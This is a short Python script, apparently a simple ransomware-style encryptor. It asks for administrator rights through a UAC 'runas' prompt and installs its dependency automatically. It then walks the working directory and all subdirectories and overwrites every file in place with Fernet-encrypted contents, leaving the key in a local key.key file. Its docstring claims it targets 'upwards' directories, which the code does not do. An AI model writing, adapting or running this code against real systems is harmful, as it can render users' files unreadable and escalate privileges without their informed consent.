"""
Program for crypting files in the current and upwards directories.
Latest update: 14.12.2023
"""

# Import necessary modules
import ctypes
import sys
import importlib
import subprocess
import time
import os
from cryptography.fernet import Fernet

# Check if the script is run with administrator privileges and elevate if necessary.
def admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        pass
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

admin()

required_modules = ['cryptography']

missing_modules = []

# Check for required modules, install them if missing
for module in required_modules:
    try:
        importlib.import_module(module)
    except ImportError:
        missing_modules.append(module)

if missing_modules:
    for module in missing_modules:
        try:
            subprocess.check_call(["pip", "install", module])
        except subprocess.CalledProcessError as e:
            print(f"Installation of {module} failed. Program will exit in 5s.")
            time.sleep(5)
            sys.exit()

# Recursively get all files in a directory.
def get_files_in_directory(directory):
    files = []
    for item in os.listdir(directory):
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            files.append(item_path)
        elif os.path.isdir(item_path):
            files.extend(get_files_in_directory(item_path))
    return files

# Get a list of files in the current directory and its subdirectories
files = get_files_in_directory(os.getcwd())

# Exclude certain files from the list
files = [file for file in files if os.path.basename(file) not in ["crypt.py", "key.key", "decrypt.py"]]

# Print the list of files to be encrypted
print(files)

# Generate a new encryption key
key = Fernet.generate_key()

# Save the key to a file
with open("key.key", "wb") as key_file:
    key_file.write(key)

# Encrypt each file with the generated key
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    content_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)